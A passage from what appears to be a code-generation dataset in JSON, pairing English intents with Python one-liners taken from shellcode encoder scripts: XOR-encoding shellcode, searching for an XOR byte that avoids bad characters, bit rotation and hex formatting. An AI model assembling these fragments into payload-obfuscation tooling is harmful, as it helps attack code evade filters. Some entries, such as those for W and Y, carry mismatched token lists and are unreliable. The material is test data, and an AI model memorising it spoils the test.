      "swapped",
      "=",
      "[",
      "]"
    ]
  },
  {
    "intent": "append the element x of execve_shellcode to swapped",
    "rewritten_intent": "append the element x of execve_shellcode to swapped",
    "snippet": "swapped.append(execve_shellcode[x])",
    "slot_map": {
      "execve_shellcode": "var0"
    },
    "intent_tokens": [
      "append",
      "element",
      "x",
      "of",
      "var0",
      "to",
      "swapped"
    ],
    "snippet_tokens": [
      "swapped.append",
      "(",
      "var0",
      "[",
      "x",
      "]",
      ")"
    ]
  },
  {
    "intent": "append the element x + 1 of execve_shellcode to swapped",
    "rewritten_intent": "append the element x + 1 of execve_shellcode to swapped",
    "snippet": "swapped.append(execve_shellcode[x+1])",
    "slot_map": {
      "execve_shellcode": "var1",
      "+": "var0"
    },
    "intent_tokens": [
      "append",
      "element",
      "x",
      "var0",
      "1",
      "of",
      "var1",
      "to",
      "swapped"
    ],
    "snippet_tokens": [
      "swapped.append",
      "(",
      "var1",
      "[",
      "x",
      "+",
      "1",
      "]",
      ")"
    ]
  },
  {
    "intent": "separate every 4 characters of the string swapped with the separator \", \"",
    "rewritten_intent": "separate every 4 characters of the string swapped with the separator \", \"",
    "snippet": "swapped=\", \".join(swapped[i:i+4] for i in range(0, len(swapped), 4))",
    "slot_map": {
      "\", \"": "var0"
    },
    "intent_tokens": [
      "separate",
      "every",
      "4",
      "characters",
      "of",
      "string",
      "swapped",
      "with",
      "separator",
      "var0"
    ],
    "snippet_tokens": [
      "swapped",
      "=",
      "'",
      ",",
      "'.join",
      "(",
      "swapped",
      "[",
      "i",
      ":",
      "i",
      "+",
      "4",
      "]",
      "for",
      "i",
      "in",
      "range",
      "(",
      "0",
      ",",
      "len",
      "(",
      "swapped",
      ")",
      ",",
      "4",
      ")",
      ")"
    ]
  },
  {
    "intent": "add \"0x\" to every 2 characters of the string swapped",
    "rewritten_intent": "add \"0x\" to every 2 characters of the string swapped",
    "snippet": "swapped=\"0x\"+\"0x\".join(a+b for a,b in zip(swapped[::2], swapped[1::2]))",
    "slot_map": {
      "\"0x\"": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "to",
      "every",
      "2",
      "characters",
      "of",
      "string",
      "swapped"
    ],
    "snippet_tokens": [
      "swapped",
      "=",
      "'0x",
      "'",
      "+",
      "'0x'.join",
      "(",
      "a",
      "+",
      "b",
      "for",
      "a",
      ",",
      "b",
      "in",
      "zip",
      "(",
      "swapped",
      "[",
      ":",
      ":2",
      "]",
      ",",
      "swapped",
      "[",
      "1",
      ":",
      ":2",
      "]",
      ")",
      ")"
    ]
  },
  {
    "intent": "swapped is the hexadecimal represenation of the array of bytes swapped",
    "rewritten_intent": "swapped is the hexadecimal represenation of the array of bytes swapped",
    "snippet": "swapped=binascii.hexlify(bytearray(swapped))",
    "slot_map": {
      "represenation": "var0"
    },
    "intent_tokens": [
      "swapped",
      "is",
      "hexadecimal",
      "var0",
      "of",
      "array",
      "of",
      "bytes",
      "swapped"
    ],
    "snippet_tokens": [
      "swapped",
      "=",
      "binascii.hexlify",
      "(",
      "bytearray",
      "(",
      "swapped",
      ")",
      ")"
    ]
  },
  {
    "intent": "terminate the program",
    "rewritten_intent": "terminate the program",
    "snippet": "sys.exit()",
    "slot_map": {},
    "intent_tokens": [
      "terminate",
      "program"
    ],
    "snippet_tokens": [
      "sys.exit",
      "(",
      ")"
    ]
  },
  {
    "intent": "call the exit function from sys with 0 as argument",
    "rewritten_intent": "call the exit function from sys with 0 as argument",
    "snippet": "sys.exit(0)",
    "slot_map": {
      "sys": "var0"
    },
    "intent_tokens": [
      "call",
      "exit",
      "function",
      "from",
      "var0",
      "with",
      "0",
      "as",
      "argument"
    ],
    "snippet_tokens": [
      "var0.exit",
      "(",
      "0",
      ")"
    ]
  },
  {
    "intent": "Set total to the number of command-line arguments",
    "rewritten_intent": "Set total to the number of command-line arguments",
    "snippet": "total = len(sys.argv)",
    "slot_map": {},
    "intent_tokens": [
      "Set",
      "total",
      "to",
      "number",
      "of",
      "command-line",
      "arguments"
    ],
    "snippet_tokens": [
      "total",
      "=",
      "len",
      "(",
      "sys.argv",
      ")"
    ]
  },
  {
    "intent": "try",
    "rewritten_intent": "try",
    "snippet": "try:",
    "slot_map": {},
    "intent_tokens": [
      "try"
    ],
    "snippet_tokens": [
      "try",
      ":"
    ]
  },
  {
    "intent": "subtract 1 from 2 raised to max_bits and assign the result to val1",
    "rewritten_intent": "subtract 1 from 2 raised to max_bits and assign the result to val1",
    "snippet": "val1 = 2**max_bits-1",
    "slot_map": {
      "max_bits": "var0",
      "val1": "var1"
    },
    "intent_tokens": [
      "subtract",
      "1",
      "from",
      "2",
      "raised",
      "to",
      "var0",
      "and",
      "assign",
      "result",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "=",
      "2",
      "*",
      "*",
      "var0",
      "-",
      "1"
    ]
  },
  {
    "intent": "val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i",
    "rewritten_intent": "val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i",
    "snippet": "val1 = int(byte.encode('hex'), 16) ^ i",
    "slot_map": {
      "val1": "var0",
      "bitwise": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "result",
      "of",
      "var1",
      "xor",
      "between",
      "integer",
      "base",
      "16",
      "of",
      "string",
      "byte",
      "encoded",
      "to",
      "hex",
      "and",
      "i"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "int",
      "(",
      "byte.encode",
      "(",
      "'hex",
      "'",
      ")",
      ",",
      "16",
      ")",
      "^",
      "i"
    ]
  },
  {
    "intent": "val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte",
    "rewritten_intent": "val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte",
    "snippet": "val2 = int(chunk[i].encode('hex'), 16) ^ xor_byte",
    "slot_map": {
      "xor_byte": "var2",
      "val2": "var0",
      "bitwise": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "result",
      "of",
      "var1",
      "xor",
      "between",
      "integer",
      "base",
      "16",
      "of",
      "element",
      "i",
      "of",
      "chunk",
      "encoded",
      "to",
      "hex",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "int",
      "(",
      "chunk",
      "[",
      "i",
      "]",
      ".encode",
      "(",
      "'hex",
      "'",
      ")",
      ",",
      "16",
      ")",
      "^",
      "var2"
    ]
  },
  {
    "intent": "val2 is rbits modulo max_bits",
    "rewritten_intent": "val2 is rbits modulo max_bits",
    "snippet": "val2 = r_bits % max_bits",
    "slot_map": {
      "max_bits": "var3",
      "val2": "var0",
      "rbits": "var1",
      "modulo": "var2"
    },
    "intent_tokens": [
      "var0",
      "is",
      "var1",
      "var2",
      "var3"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "r_bits",
      "%",
      "var3"
    ]
  },
  {
    "intent": "W is a string '\\033[0m'",
    "rewritten_intent": "W is a string '\\033[0m'",
    "snippet": "W = '\\033[0m'",
    "slot_map": {
      "'\\033[0m'": "var0"
    },
    "intent_tokens": [
      "W",
      "is",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "r_bits",
      "%",
      "var3"
    ]
  },
  {
    "intent": "while the length of shellcode is greater than integer 0",
    "rewritten_intent": "while the length of shellcode is greater than integer 0",
    "snippet": "while len(shellcode) > 0:",
    "slot_map": {
      "shellcode": "var0",
      "than": "var1"
    },
    "intent_tokens": [
      "while",
      "length",
      "of",
      "var0",
      "is",
      "greater",
      "var1",
      "integer",
      "0"
    ],
    "snippet_tokens": [
      "while",
      "len",
      "(",
      "var0",
      ")",
      ">",
      "0",
      ":"
    ]
  },
  {
    "intent": "while x is less than shellcode_len",
    "rewritten_intent": "while x is less than shellcode_len",
    "snippet": "while x < shellcode_len:",
    "slot_map": {
      "shellcode_len": "var1",
      "than": "var0"
    },
    "intent_tokens": [
      "while",
      "x",
      "is",
      "less",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "while",
      "x",
      "<",
      "var1",
      ":"
    ]
  },
  {
    "intent": "start a while loop with the condition xor_byte_good if equivalent to False",
    "rewritten_intent": "start a while loop with the condition xor_byte_good if equivalent to False",
    "snippet": "while(xor_byte_good == False):",
    "slot_map": {
      "False": "var2",
      "xor_byte_good": "var0"
    },
    "intent_tokens": [
      "start",
      "while",
      "loop",
      "with",
      "condition",
      "var0",
      "if",
      "equivalent",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "while",
      "(",
      "var0",
      "==",
      "var2",
      ")",
      ":"
    ]
  },
  {
    "intent": "open the file stored in shellcode_file using an alias variable f",
    "rewritten_intent": "open the file stored in shellcode_file using an alias variable f",
    "snippet": "with open(shellcode_file) as f:",
    "slot_map": {
      "shellcode_file": "var0"
    },
    "intent_tokens": [
      "open",
      "file",
      "stored",
      "in",
      "var0",
      "using",
      "alias",
      "variable",
      "f"
    ],
    "snippet_tokens": [
      "with",
      "open",
      "(",
      "var0",
      ")",
      "as",
      "f",
      ":"
    ]
  },
  {
    "intent": "increment x by 1",
    "rewritten_intent": "increment x by 1",
    "snippet": "x += 1",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "x",
      "by",
      "1"
    ],
    "snippet_tokens": [
      "x",
      "+=",
      "1"
    ]
  },
  {
    "intent": "increment x by 2",
    "rewritten_intent": "increment x by 2",
    "snippet": "x += 2",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "x",
      "by",
      "2"
    ],
    "snippet_tokens": [
      "x",
      "+=",
      "2"
    ]
  },
  {
    "intent": "x is not x",
    "rewritten_intent": "x is not x",
    "snippet": "x = ~x",
    "slot_map": {},
    "intent_tokens": [
      "x",
      "is",
      "not",
      "x"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "~x"
    ]
  },
  {
    "intent": "x is 0",
    "rewritten_intent": "x is 0",
    "snippet": "x = 0",
    "slot_map": {},
    "intent_tokens": [
      "x",
      "is",
      "0"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "0"
    ]
  },
  {
    "intent": "assign the variable x the value of the function rol with x and rand as parameters",
    "rewritten_intent": "assign the variable x the value of the function rol with x and rand as parameters",
    "snippet": "x = rol(x,rand)",
    "slot_map": {
      "rol": "var0"
    },
    "intent_tokens": [
      "assign",
      "variable",
      "x",
      "value",
      "of",
      "function",
      "var0",
      "with",
      "x",
      "and",
      "rand",
      "as",
      "parameters"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "var0",
      "(",
      "x",
      ",",
      "rand",
      ")"
    ]
  },
  {
    "intent": "left shift x by 1",
    "rewritten_intent": "left shift x by 1",
    "snippet": "x = x << 1",
    "slot_map": {},
    "intent_tokens": [
      "left",
      "shift",
      "x",
      "by",
      "1"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "x",
      "<",
      "<",
      "1"
    ]
  },
  {
    "intent": "x is x xor 0xDD",
    "rewritten_intent": "x is x xor 0xDD",
    "snippet": "x = x^0xDD",
    "slot_map": {},
    "intent_tokens": [
      "x",
      "is",
      "x",
      "xor",
      "0xDD"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "x",
      "^",
      "221"
    ]
  },
  {
    "intent": "assign the variable x the value of the bitwise xor operation of x and rand",
    "rewritten_intent": "assign the variable x the value of the bitwise xor operation of x and rand",
    "snippet": "x = x^rand",
    "slot_map": {
      "bitwise": "var0"
    },
    "intent_tokens": [
      "assign",
      "variable",
      "x",
      "value",
      "of",
      "var0",
      "xor",
      "operation",
      "of",
      "x",
      "and",
      "rand"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "x",
      "^",
      "rand"
    ]
  },
  {
    "intent": "set x to y minus 0x10",
    "rewritten_intent": "set x to y minus 0x10",
    "snippet": "x = y - 0x10",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "x",
      "to",
      "y",
      "minus",
      "0x10"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "y",
      "-",
      "16"
    ]
  },
  {
    "intent": "set x to y minus 0x2",
    "rewritten_intent": "set x to y minus 0x2",
    "snippet": "x = y - 0x2",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "x",
      "to",
      "y",
      "minus",
      "0x2"
    ],
    "snippet_tokens": [
      "x",
      "=",
      "y",
      "-",
      "2"
    ]
  },
  {
    "intent": "xor is the second element of sys.argv converted to integer",
    "rewritten_intent": "xor is the second element of sys.argv converted to integer",
    "snippet": "xor = int(sys.argv[2])",
    "slot_map": {
      "sys.argv": "var0"
    },
    "intent_tokens": [
      "xor",
      "is",
      "second",
      "element",
      "of",
      "var0",
      "converted",
      "to",
      "integer"
    ],
    "snippet_tokens": [
      "xor",
      "=",
      "int",
      "(",
      "sys.argv",
      "[",
      "2",
      "]",
      ")"
    ]
  },
  {
    "intent": "XOR is the third element of sys.argv converted to integer",
    "rewritten_intent": "XOR is the third element of sys.argv converted to integer",
    "snippet": "XOR = int(sys.argv[3])",
    "slot_map": {
      "XOR": "var0",
      "sys.argv": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "third",
      "element",
      "of",
      "var1",
      "converted",
      "to",
      "integer"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "int",
      "(",
      "sys.argv",
      "[",
      "3",
      "]",
      ")"
    ]
  },
  {
    "intent": "assign 0 to xor_byte",
    "rewritten_intent": "assign 0 to xor_byte",
    "snippet": "xor_byte = 0",
    "slot_map": {
      "xor_byte": "var0"
    },
    "intent_tokens": [
      "assign",
      "0",
      "to",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "0"
    ]
  },
  {
    "intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars",
    "rewritten_intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars",
    "snippet": "xor_byte = find_valid_xor_byte(chunk, bad_chars)",
    "slot_map": {
      "find_valid_xor_byte": "var0",
      "bad_chars": "var1"
    },
    "intent_tokens": [
      "xor_byte",
      "is",
      "output",
      "of",
      "function",
      "var0",
      "with",
      "input",
      "parameters",
      "chunk",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor_byte",
      "=",
      "var0",
      "(",
      "chunk",
      ",",
      "var1",
      ")"
    ]
  },
  {
    "intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars",
    "rewritten_intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars",
    "snippet": "xor_byte = find_valid_xor_byte(string1, bad_chars)",
    "slot_map": {
      "find_valid_xor_byte": "var0",
      "bad_chars": "var2",
      "string1": "var1"
    },
    "intent_tokens": [
      "xor_byte",
      "is",
      "output",
      "of",
      "function",
      "var0",
      "with",
      "input",
      "parameters",
      "var1",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "xor_byte",
      "=",
      "var0",
      "(",
      "var1",
      ",",
      "var2",
      ")"
    ]
  },
  {
    "intent": "set the variable xor_byte_good to the value False",
    "rewritten_intent": "set the variable xor_byte_good to the value False",
    "snippet": "xor_byte_good = False",
    "slot_map": {
      "False": "var2",
      "xor_byte_good": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "var0",
      "to",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var2"
    ]
  },
  {
    "intent": "set the variable xor_byte_good to the value True",
    "rewritten_intent": "set the variable xor_byte_good to the value True",
    "snippet": "xor_byte_good = True",
    "slot_map": {
      "True": "var2",
      "xor_byte_good": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "var0",
      "to",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var2"
    ]
  },
  {
    "intent": "XOR_HEX is XOR converted to hexadecimal",
    "rewritten_intent": "XOR_HEX is XOR converted to hexadecimal",
    "snippet": "XOR_HEX = hex(XOR)",
    "slot_map": {
      "XOR": "var0"
    },
    "intent_tokens": [
      "XOR_HEX",
      "is",
      "var0",
      "converted",
      "to",
      "hexadecimal"
    ],
    "snippet_tokens": [
      "XOR_HEX",
      "=",
      "hex",
      "(",
      "var0",
      ")"
    ]
  },
  {
    "intent": "Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx",
    "rewritten_intent": "Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx",
    "snippet": "xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))",
    "slot_map": {
      "rev_suplx": "var2",
      "subfs": "var0",
      "indicies": "var4",
      "int16": "var5"
    },
    "intent_tokens": [
      "Take",
      "absolute",
      "value",
      "of",
      "var0",
      "then",
      "convert",
      "var0",
      "to",
      "integer",
      ",",
      "then",
      "cast",
      "to",
      "hexadecimal",
      ",",
      "slice",
      "variable",
      "var2",
      "between",
      "var4",
      "0",
      "and",
      "2",
      "then",
      "cast",
      "var2",
      "to",
      "type",
      "var5",
      "store",
      "value",
      "of",
      "summation",
      "in",
      "variable",
      "xxx"
    ],
    "snippet_tokens": [
      "xxx",
      "=",
      "hex",
      "(",
      "int",
      "(",
      "abs",
      "(",
      "var0",
      ")",
      ")",
      "+",
      "int",
      "(",
      "var2",
      "[",
      "0:2",
      "]",
      ",",
      "16",
      ")",
      ")"
    ]
  },
  {
    "intent": "compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y",
    "rewritten_intent": "compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y",
    "snippet": "y ^= bytearray(shellcode)[1]",
    "slot_map": {
      "bitwise": "var0",
      "shellcode": "var1"
    },
    "intent_tokens": [
      "compute",
      "var0",
      "xor",
      "of",
      "y",
      "and",
      "first",
      "element",
      "of",
      "var1",
      "converted",
      "into",
      "byte",
      "array",
      "and",
      "store",
      "result",
      "in",
      "variable",
      "y"
    ],
    "snippet_tokens": [
      "y",
      "^=",
      "bytearray",
      "(",
      "var1",
      ")",
      "[",
      "1",
      "]"
    ]
  },
  {
    "intent": "Y is a '\\033[33m'",
    "rewritten_intent": "Y is a '\\033[33m'",
    "snippet": "Y = '\\033[33m'",
    "slot_map": {
      "'\\033[33m'": "var0"
    },
    "intent_tokens": [
      "Y",
      "is",
      "var0"
    ],
    "snippet_tokens": [
      "y",
      "^=",
      "bytearray",
      "(",
      "var1",
      ")",
      "[",
      "1",
      "]"
    ]
  },
  {
    "intent": "y is not x",
    "rewritten_intent": "y is not x",
    "snippet": "y = ~x",
    "slot_map": {},
    "intent_tokens": [
      "y",
      "is",
      "not",
      "x"
    ],
    "snippet_tokens": [
      "y",
      "=",
      "~x"
    ]
  },
  {
    "intent": "compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array",
    "rewritten_intent": "compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array",
    "snippet": "y = bytearray(shellcode)[0]^bytearray(shellcode)[1]",
    "slot_map": {
      "bitwise": "var0",
      "shellcode": "var1",
      "bytearray": "var3"
    },
    "intent_tokens": [
      "compute",
      "var0",
      "xor",
      "of",
      "first",
      "element",
      "in",
      "var1",
      "converted",
      "into",
      "var3",
      "and",
      "second",
      "element",
      "of",
      "var1",
      "converted",
      "into",
      "byte",
      "array"
    ],
    "snippet_tokens": [
      "y",
      "=",
      "var3",
      "(",
      "var1",
      ")",
      "[",
      "0",
      "]",
      "^",
      "var3",
      "(",
      "var1",
      ")",
      "[",
      "1",
      "]"
    ]
  },
  {
    "intent": "set the variable y to x bitwise xor of 0x88",
    "rewritten_intent": "set the variable y to x bitwise xor of 0x88",
    "snippet": "y = x ^ 0x88",
    "slot_map": {
      "bitwise": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "y",
      "to",
      "x",
      "var0",
      "xor",
      "of",
      "0x88"
    ],
    "snippet_tokens": [
      "y",
      "=",
      "x",
      "^",
      "136"
    ]
  },
  {
    "intent": "set y to x bitwise xor of 0x97",
    "rewritten_intent": "set y to x bitwise xor of 0x97",
    "snippet": "y = x ^ 0x97",
    "slot_map": {
      "bitwise": "var0"
    },
    "intent_tokens": [
      "set",
      "y",
      "to",
      "x",
      "var0",
      "xor",
      "of",
      "0x97"
    ],
    "snippet_tokens": [
      "y",
      "=",
      "x",
      "^",
      "151"
    ]
  },
  {
    "intent": "y is x xor 0xAA",
    "rewritten_intent": "y is x xor 0xAA",
    "snippet": "y = x^0xAA",
    "slot_map": {},
    "intent_tokens": [
      "y",
      "is",
      "x",
      "xor",
      "0xAA"
    ],
    "snippet_tokens": [
      "y",
      "=",
      "x",
      "^",
      "170"
    ]
  },
  {
    "intent": "set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray",
    "rewritten_intent": "set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray",
    "snippet": "y = x^bytearray(shellcode)[n]",
    "slot_map": {
      "bitwise": "var0",
      "shellcode": "var1",
      "bytearray": "var2"
    },
    "intent_tokens": [
      "set",
      "variable",
      "y",
      "equal",
      "to",
      "x",
      "var0",
      "xor",
      "element",
      "n",
      "of",
      "var1",
      "converted",
      "into",
      "var2"
    ],
    "snippet_tokens": [
      "y",
      "=",
      "x",
      "^",
      "var2",
      "(",
      "var1",
      ")",
      "[",
      "n",
      "]"
    ]
  },
  {
    "intent": "set the variable z to bitwise not x",
    "rewritten_intent": "set the variable z to bitwise not x",
    "snippet": "z = ~x",
    "slot_map": {
      "bitwise": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "z",
      "to",
      "var0",
      "not",
      "x"
    ],
    "snippet_tokens": [
      "z",
      "=",
      "~x"
    ]
  }
]